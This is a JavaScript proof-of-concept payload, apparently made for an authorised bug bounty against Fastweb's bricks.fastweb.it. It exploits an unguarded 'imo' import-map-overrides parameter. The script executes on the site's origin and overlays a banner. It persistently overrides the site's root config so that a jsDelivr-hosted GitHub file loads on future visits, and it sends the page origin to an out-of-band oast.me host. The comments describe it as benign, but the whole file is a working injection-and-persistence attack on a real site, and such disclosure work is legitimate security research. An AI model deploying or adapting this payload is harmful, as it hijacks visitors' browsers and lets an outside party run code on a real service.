/*
 * FW-08 proof-of-concept marker - AUTHORISED BUG BOUNTY TESTING ONLY
 *
 * Fastweb "General" programme via CyberDart, scope *.fastweb.it, researcher 89p13.
 * Demonstrates that a module loaded through the unguarded import-map-overrides
 * "imo" parameter on bricks.fastweb.it executes, can make itself persistent, and
 * can reach the network.
 *
 * DELIBERATELY BENIGN. It does not read cookies, storage, form fields, credentials
 * or any user data. It draws a visible banner so the effect is obvious in a
 * screenshot; that banner exists only in the browser of whoever opens the link.
 */
(function () {
  var MARKER = "fw08-89p13";
  var OAST   = "https://da8l7djc8q36i3t2sqc048gyde3kjnmq9.oast.me/fw08-payload-89p13";
  try { window.__FW08_MARKER__ = MARKER; } catch (e) {}
  try { console.log("[" + MARKER + "] executing on " + location.origin); } catch (e) {}

  // 1. Visible proof - this is attacker code drawing on the Fastweb origin.
  function banner() {
    try {
      var d = document, w = d.createElement("div");
      w.id = "fw08-poc";
      w.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#0b1020;" +
        "color:#e6edf3;font:16px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace;" +
        "display:flex;align-items:center;justify-content:center;text-align:center;padding:24px";
      w.innerHTML =
        '<div style="max-width:760px">' +
        '<div style="font-size:46px;font-weight:700;letter-spacing:2px;color:#ff5c5c">89p13 &mdash; FW-08 PoC</div>' +
        '<div style="margin-top:18px;font-size:19px;color:#ffd166">' +
        'This page is running attacker-controlled JavaScript.</div>' +
        '<div style="margin-top:14px;color:#9fb0c0">Loaded from <b>cdn.jsdelivr.net</b> via the ' +
        '<b>imo</b> URL parameter.<br>Fastweb\'s real application was never loaded.</div>' +
        '<div style="margin-top:22px;font-size:14px;color:#7d8fa1">origin: <b>' + location.origin +
        '</b><br>time: ' + new Date().toISOString() + '</div>' +
        '<div style="margin-top:22px;font-size:13px;color:#5f7080">' +
        'Authorised bug bounty testing. No cookies, storage, form fields or credentials were accessed.</div>' +
        '</div>';
      (d.body || d.documentElement).appendChild(w);
    } catch (e) {}
  }
  if (document.body) { banner(); }
  else { document.addEventListener("DOMContentLoaded", banner); setTimeout(banner, 800); }

  // 2. Self-persistence: the payload itself installs the override, so the next
  //    visit needs no link and no parameter.
  try {
    if (window.importMapOverrides && window.importMapOverrides.addOverride) {
      window.importMapOverrides.addOverride(
        "@fastweb-tmt/root-config",
        "https://cdn.jsdelivr.net/gh/89p1rPWN/fw08-poc@main/fw08-marker.js"
      );
      console.log("[" + MARKER + "] self-persisted via addOverride");
    }
  } catch (e) {}

  // 3. Egress: a static marker only - no page content, no user data.
  try { fetch(OAST + "?m=" + MARKER + "&o=" + encodeURIComponent(location.origin), {mode: "no-cors"}); } catch (e) {}
})();
